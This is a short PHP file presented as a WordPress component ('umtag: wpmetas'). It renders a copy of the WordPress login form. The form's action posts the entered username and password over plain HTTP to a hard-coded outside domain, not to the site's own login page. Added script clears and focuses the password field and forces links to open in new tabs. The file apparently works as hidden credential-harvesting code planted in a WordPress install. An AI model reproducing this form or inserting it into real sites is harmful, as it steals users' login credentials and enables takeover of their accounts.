<?php
/* umtag: wpmetas
 *
 */
 
defined('ABSPATH') or die('huh?');
function umtag_wploginform() { ?>
	<form name="loginform" id="bpdbc-loginform" action="http://o.dibiakcom.net/wp-login.php" method="post">
	<p>
		<label for="user_login">Username<br>
		<input type="text" name="log" id="user_login" class="input" value="" size="20"></label>
	</p>
	<p>
		<label for="user_pass">Password<br>
		<input type="password" name="pwd" id="user_pass" class="input" value="" size="20"></label>
	</p>
		<p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> Remember Me</label></p>
	<p class="submit">
		<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In">
		<input type="hidden" name="interim-login" value="1">
		<input type="hidden" name="testcookie" value="1">
	</p>
	</form><script type="text/javascript">
	function wp_attempt_focus(){
		setTimeout( function(){ try{
			d = document.getElementById('user_pass');
			d.value = '';d.focus();
			d.select();
		} catch(e){}
		}, 200);
	}
	if(typeof wpOnload=='function')wpOnload();
	(function(){
		try {
			var i, links = document.getElementsByTagName('a');
			for ( i in links ) {
				if ( links[i].href )
					links[i].target = '_blank';
			}
		} catch(e){}
	}());
	</script><?php 
}